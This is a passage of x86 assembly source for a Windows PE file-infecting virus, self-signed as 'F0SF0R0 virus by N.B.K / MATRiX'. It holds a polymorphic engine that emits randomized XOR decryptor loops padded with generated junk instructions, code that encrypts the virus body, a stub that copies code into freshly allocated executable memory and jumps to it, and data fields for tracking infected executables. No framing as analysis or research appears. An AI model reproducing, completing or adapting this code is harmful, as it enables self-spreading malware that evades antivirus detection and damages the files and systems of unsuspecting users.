                  and al,0001H                  ;
                  jz @@14                       ;
                                                ;
                  mov ax,0C483H                 ;
                  stosw                         ;
                                                ;
                  mov al,04H                    ;
                  stosb                         ;
                                                ;
                  jmp short @@15                ;
   @@14:                                        ;
                  mov ax,0EC83H                 ;
                  stosw                         ;
                                                ;
                  mov al,0FCH                   ;
                  stosb                         ;
   @@15:                                        ;
                  call chg_garble               ;
                                                ;
                  mov eax,[ebp+ini_SEH]         ;
                  sub eax,[ebp+all_ini]         ;
                  mov edx,eax                   ;
                                                ;
                  mov eax,[ebp+off6]            ;
                  sub eax,[ebp+off1]            ;
                                                ;
                  mov ebx,[ebp+_RVA]            ;
                  add ebx,edx                   ;
                  add ebx,eax                   ;
                  add ebx,3                     ;
                                                ;
                  mov eax,[ebp+offset off1]     ;
                  mov [eax],ebx                 ;
                                                ;
                  xor dl,dl                     ;
                  xor bl,bl                     ;
                                                ;
                  call rnd                      ;
                  mov edx,eax                   ;
                                                ;
                  mov [ebp+_off1],edi           ;
                                                ;
                  call edi_offset               ;
                                                ;
                  mov ecx,dword ptr [ebp+len]   ;
                  call len_ecx                  ;
                                                ;
                  push edi                      ;
                  call edi2eax                  ;
                                                ;
                  call xor_eax                  ;
                  mov edx,[edi-4]
                  mov dword ptr [ebp+KEY],edx   ;
                                                ;
                  call eax2edi                  ;
                                                ;
                  call add_edi                  ;
                                                ;
                  pop ebx                       ;
                  call do_loop                  ;
                  mov [ebp+dec_end],edi         ;
                                                ;
                  call chg_garble               ;
                                                ;
                  mov eax,edi                   ;
                  sub eax,[ebp+all_ini]         ;
                  add eax,[ebp+_RVA]            ;
                  mov esi,[ebp+_off2]           ;
                  add eax,2                     ;
                  mov [esi],eax                 ;
                  push edi                      ;
                                                ;
                  mov ecx,dword ptr [ebp+len]   ;
                  mov esi,dword ptr [ebp+offsetvir]
                  rep movsd                     ;
                  mov ebx,edi                   ;
                                                ;
                  pop edi                       ;
                  mov esi,edi                   ;
                  mov ecx,dword ptr [ebp+len]   ;
   crypt_vir:                                   ;
                  lodsd                         ;
                  xor eax,edx                   ;
                  stosd                         ;
                  loop crypt_vir                ;
                                                ;
                  mov edi,ebx                   ;
                                                ;
                  mov dr1,edi                   ;
                  sub edi,[ebp+all_ini]         ;
                  mov dr0,edi                   ;
                  popad                         ;
                  mov edi,dr1
                  mov eax,dr0                   ;
                  ret                           ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                        GARBAGE GENERATOR   *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   garbage proc                                 ;
                  push eax                      ;
                  push esi                      ;
                  xor eax,eax                   ;
                  in al,40H                     ;
                  and al,0001b                  ;
                  jz @@1                        ;
                  in al,40H                     ;
                  not al                        ;
                  jmp short @@2                 ;
   @@1:                                         ;
                  in al,40H                     ;
   @@2:                                         ;
                  and al,00111100b              ;
                  lea esi,[ebp+offset GARBAGE_TABLE0]
                  add esi,eax                   ;
                  mov esi,dword ptr [esi]       ;
                  add esi,ebp                   ;
                  call esi                      ;
                  cmp byte ptr [edi-1],0ACH     ;
                  jne @@3                       ;
                  mov byte ptr [edi-1],90H      ;
   @@3:                                         ;
                  pop esi                       ;
                  pop eax                       ;
                  ret                           ;
   garbage endp                                 ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                        GARBAGE TABLE 0     *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
                  GARBAGE_TABLE0:               ;
                                                ;
                  dd offset mov_eax             ;
                  dd offset mov_ah              ;
                  dd offset add_al              ;
                  dd offset sub_ebx             ;
                  dd offset shl_reg_cl          ;
                  dd offset xchg_edx            ;
                  dd offset or_reg_reg          ;
                  dd offset push_pop            ;
                  dd offset test_eax            ;
                  dd offset xor_reg_num         ;
                  dd offset jump                ;
                  dd offset neg_reg             ;
                  dd offset adc_reg             ;
                  dd offset adc_reg_num         ;
                  dd offset and_reg_num         ;
                  dd offset bt_reg_reg          ;
   ;              dd offset bt_reg_reg          ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                        CHG_GARBLE          *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   chg_garble proc                              ;
                  push eax                      ;
                  call garbage                  ;
                  call garbage                  ;
                  call rnd                      ;
                  and eax,00000001H             ;
                  jnz @@38                      ;
                  call garbage                  ;
                  call garbage                  ;
                  call rnd                      ;
                  and eax,00000001H             ;
                  jnz @@38                      ;
                  call garbage                  ;
                  call garbage                  ;
                  call rnd                      ;
                  and eax,00000001H             ;
                  jnz @@37                      ;
   @@38:                                        ;
                  call garbage                  ;
   @@37:                                        ;
                  pop eax                       ;
                  ret                           ;
   chg_garble endp                              ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                        MOV EAX, ?          *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   mov_eax proc                                 ;
                  mov al,0B8H                   ;
                  cmp byte ptr [edi-5],al       ;
                  je @@1                        ;
                  stosb                         ;
                  call rnd                      ;
                  stosd                         ;
   @@1:                                         ;
                  ret                           ;
   mov_eax endp                                 ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   mov_reg proc                                 ;
   @@1:                                         ;
                  in al,40H                     ;
                  cmp al,0C0H                   ;
                  je @@2                        ;
                  cmp al,0C1H                   ;
                  je @@2                        ;
                  cmp al,0C2H                   ;
                  je @@2                        ;
                  cmp al,0C3H                   ;
                  je @@2                        ;
                  jmp short @@1                 ;
   @@2:                                         ;
                  ret                           ;
   mov_reg endp                                 ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                        MOV AH,??           *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   mov_ah proc                                  ;
                  mov al,0B4H                   ;
                  cmp byte ptr [edi-2],al       ;
                  je @@1                        ;
                  stosb                         ;
                  in al,40H                     ;
                  stosb                         ;
   @@1:                                         ;
                  ret                           ;
   mov_ah endp                                  ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                        ADD AL,REG          *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   add_al proc                                  ;
                  mov al,2                      ;
                  stosb                         ;
                  call mov_reg                  ;
                  stosb                         ;
                  ret                           ;
   add_al endp                                  ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                        SUB EBX,REG         *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   sub_ebx proc                                 ;
                  mov al,2BH                    ;
                  stosb                         ;
                  call mov_reg                  ;
                  add al,18H                    ;
                  stosb                         ;
   @@1:                                         ;
                  ret                           ;
                  sub_ebx endp                  ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                        XCHG EDX,REG        *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   xchg_edx proc                                ;
                  mov al,87H                    ;
                  cmp byte ptr [edi-2],al       ;
                  je @@1                        ;
                  stosb                         ;
   @@2:                                         ;
                  call mov_reg                  ;
                  cmp al,0C0H                   ;
                  je @@2                        ;
                  add al,10H                    ;
                  stosb                         ;
   @@1:                                         ;
                  ret                           ;
   xchg_edx endp                                ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                        MOV DR0,REG         *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   mov_dr0 proc                                 ;
                  mov ax,230FH                  ;
                  stosw                         ;
                  call mov_reg                  ;
                  stosb                         ;
   @@1:                                         ;
                  ret                           ;
   mov_dr0 endp                                 ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                        TEST EAX,REG        *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   test_eax proc                                ;
                  mov al,85H                    ;
                  stosb                         ;
                  call mov_reg                  ;
                  stosb                         ;
                  ret                           ;
   test_eax endp                                ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                        CMP EAX,REG         *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   cmp_eax proc                                 ;
                  mov al,3BH                    ;
                  stosb                         ;
                  call mov_reg                  ;
                  stosb                         ;
                  ret                           ;
   cmp_eax endp                                 ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                        NEG REG             *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   neg_reg proc                                 ;
                  mov al,0F7H                   ;
                  cmp byte ptr [edi-2],al       ;
                  je @@1                        ;
                  stosb                         ;
                  call mov_reg                  ;
                  add al,18H                    ;
                  stosb                         ;
   @@1:                                         ;
                  ret                           ;
   neg_reg endp                                 ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                        ADC REG             *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   adc_reg proc                                 ;
                  mov al,13H                    ;
                  stosb                         ;
                  call mov_reg                  ;
                  stosb                         ;
                  ret                           ;
   adc_reg endp                                 ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                        ADC REG             *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   adc_reg_num proc                             ;
                  mov al,81H                    ;
                  stosb                         ;
   @@2:                                         ;
                  call mov_reg                  ;
                  cmp al,0C0H                   ;
                  je @@2                        ;
                  add al,10H                    ;
                  stosb                         ;
                  call rnd                      ;
                  stosd                         ;
                  ret                           ;
   adc_reg_num endp                             ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                        AND REG,????        *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   and_reg_num proc                             ;
                  mov al,81H                    ;
                  cmp byte ptr [edi-6],al       ;
                  je @@1                        ;
                  stosb                         ;
   @@2:                                         ;
                  call mov_reg                  ;
                  cmp al,0C0H                   ;
                  je @@2                        ;
                  add al,20H                    ;
                  stosb                         ;
                  call rnd                      ;
                  stosd                         ;
   @@1:                                         ;
                  ret                           ;
   and_reg_num endp                             ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                        BT REG,REG          *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   bt_reg_reg proc                              ;
                  cmp byte ptr [edi-3],0FH      ;
                  je @@1                        ;
                  mov ax,0A30FH                 ;
                  stosw                         ;
                  call mov_reg                  ;
                  stosb                         ;
   @@1:                                         ;
                  ret                           ;
   bt_reg_reg endp                              ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                        OR REG,REG          *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   or_reg_reg proc                              ;
                  mov al,0AH                    ;
                  cmp byte ptr [edi-2],al       ;
                  je @@1                        ;
                  stosb                         ;
                  call mov_reg                  ;
                  stosb                         ;
   @@1:                                         ;
                  ret                           ;
   or_reg_reg endp                              ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                        XOR REG16,??        *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   xor_reg_num proc                             ;
                  mov ax,8166H                  ;
                  stosw                         ;
   @@2:                                         ;
                  call mov_reg                  ;
                  cmp al,0C0H                   ;
                  je @@2                        ;
                  add al,30H                    ;
                  stosb                         ;
                  call rnd                      ;
                  stosw                         ;
                  ret                           ;
   xor_reg_num endp                             ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                        SHL E?X,CL          *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   shl_reg_cl proc                              ;
                  mov al,0D3H                   ;
                  cmp byte ptr [edi-2],al       ;
                  je @@1                        ;
                  stosb                         ;
                  call mov_reg                  ;
                  add al,20H                    ;
                  stosb                         ;
   @@1:                                         ;
                  ret                           ;
   shl_reg_cl endp                              ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                        PUSH_POP E?X        *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   push_pop proc                                ;
                  cmp dl,99H                    ;
                  je @@1                        ;
                  call mov_reg                  ;
   @@1:                                         ;
                  sub al,70H                    ;
                  stosb                         ;
                  call chg_garble               ;
                  cmp bl,99H                    ;
                  je @@2                        ;
                  add al,08H                    ;
                  stosb                         ;
   @@2:                                         ;
                  ret                           ;
   push_pop endp                                ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                        JUMP GENERATOR      *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   jump proc                                    ;
                  pushad                        ;
                  xor edx,edx                   ;
                  xor ecx,ecx                   ;
   @@2:           call rnd                      ;
                  and eax,126                   ;
                  cmp al,7                      ;
                  jbe @@2                       ;
                  mov ecx,eax                   ;
                  mov bl,al                     ;
                  mov al,0EBH                   ;
                  stosb                         ;
                  mov al,bl                     ;
                  stosb                         ;
   @@1:           call rnd                      ;
                  stosb                         ;
                  loop @@1                      ;
                  mov dr0,edi                   ;
                  popad                         ;
                  mov edi,dr0                   ;
                  ret                           ;
   jump endp                                    ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                        EDI_OFFSET          *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   edi_offset proc                              ;
                  push eax                      ;
                  mov al,0BFH                   ;
                  stosb                         ;
                  mov [ebp+_off2],edi           ;
                  xor eax,eax                   ;
                  stosd                         ;
                  pop eax                       ;
                  ret                           ;
   edi_offset endp                              ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                       MOV ECX,LENGHT       *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   len_ecx proc                                 ;
                  push eax                      ;
                  mov [ebp+_off3],edi           ;
                  mov al,0B9H                   ;
                  stosb                         ;
                  mov eax,ecx                   ;
                  stosd                         ;
                  pop eax                       ;
                  ret                           ;
   len_ecx endp                                 ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                       [EDI] - > EAX        *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   edi2eax proc                                 ;
                  push eax                      ;
                  mov ax,078BH                  ;
                  stosw                         ;
                  pop eax                       ;
                  ret                           ;
   edi2eax endp                                 ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                       XOR EAX, ????        *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   xor_eax proc                                 ;
                  push eax                      ;
                  mov al,35H                    ;
                  stosb                         ;
                  call rnd                      ;
                  stosd                         ;
                  pop eax                       ;
                  ret                           ;
   xor_eax endp                                 ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                       EAX -> [EDI]         *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   eax2edi proc                                 ;
                  push eax                      ;
                  mov ax,0789H                  ;
                  stosw                         ;
                  pop eax                       ;
                  ret                           ;
   eax2edi endp                                 ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                       ADD EDI,4            *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   add_edi proc                                 ;
                  push eax                      ;
                  mov al,83H                    ;
                  stosb                         ;
                  mov ax,04C7H                  ;
                  stosw                         ;
                  pop eax                       ;
                  ret                           ;
   add_edi endp                                 ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                       LOOP DECRYPT_INI     *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   do_loop:                                     ;
                  push eax                      ;
                  push ebx                      ;
                  mov al,0E2H                   ;
                  stosb                         ;
                  sub ebx,edi                   ;
                  dec ebx                       ;
                  mov al,bl                     ;
                  stosb                         ;
                  mov [ebp+_off4],edi           ;
                  pop ebx                       ;
                  pop eax                       ;
                  ret                           ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                           RND              *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   rnd proc                                     ;
                  pushad                        ;
                  mov eax,dword ptr [ebp+seed]  ;
                  mov ecx, 41C64E6Dh            ;
                  mul ecx                       ;
                  add eax, 00003039h            ;
                  and eax, 7FFFFFFFh            ;
                  mov dword ptr [ebp+seed],eax  ;
                  mov dr0,eax                   ;
                  popad                         ;
                  mov eax,dr0                   ;
                  ret                           ;
                  seed dd 'FUCK'                ;
   rnd endp                                     ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   exit:                                        ;
                  push 40H                      ;
                  push 103000H                  ;
                  push re_crypt_len             ;
                  xor eax,eax                   ;
                  push eax                      ;
                  call [ebp+VirtualAlloc]       ;
                                                ;
                  or eax,eax                    ;
                  jz exit_process               ;
                                                ;
                  lea ebx,[ebp+offset start]    ;
                                                ;
                  mov edi,eax                   ;
                  lea esi,[ebp+offset re_crypt] ;
                  mov ecx,re_crypt_len          ;
                  rep movsb                     ;
                                                ;
                  jmp eax                       ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   data_area:                                   ;
                  FileAttributes dd 0,1,4,7,2,1,1,9
                  FileSize       dd 0,0,0       ;
                  FileName       db 274 dup (0) ;
                  exec_time      dd 0           ;
                  oldsize        dd 0           ;
                  RVA            dd 0           ;
                  DiReCtOrY0     dd 64 dup (0)  ;
                  ini_SEH        dd 0           ;
                  off1           dd 0           ;
                  off6           dd 0           ;
                  all_ini        dd 0           ;
                  xor_reg        db 0           ;
                  _RVA           dd 0           ;
                  len            dd 0           ;
                  offsetvir      dd 0           ;
                  _off1          dd 0           ;
                  _off2          dd 0           ;
                  _off3          dd 0           ;
                  _off4          dd 0           ;
                  dec_end        dd 0           ;
                  last_sec       dd 0           ;
                  PE             dd 0           ;
                  sec            dw 0           ;
                  KERNEL32       dd 0           ;
                  GetProcAddress dd 0           ;
                  mem_addr            dd 0      ;
                  handle_new_file     dd 0      ;
                  handle_mapping      dd 0      ;
                  handle_find    dd 0           ;
                  infected       dd 0           ;
                                                ;
   sd             dd 'KAYA'                     ;
                                                ;
   db       'F0SF0R0 virus by N.B.K / MATRiX'   ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   FIM:                                         ;
                                                ;
   .code                                        ;
                  dd offset $+4                 ;
                  push 0                        ;
                  call ExitProcess              ;
                                                ;
                  extrn ExitProcess:proc        ;
                                                ;
   end start                                    ;
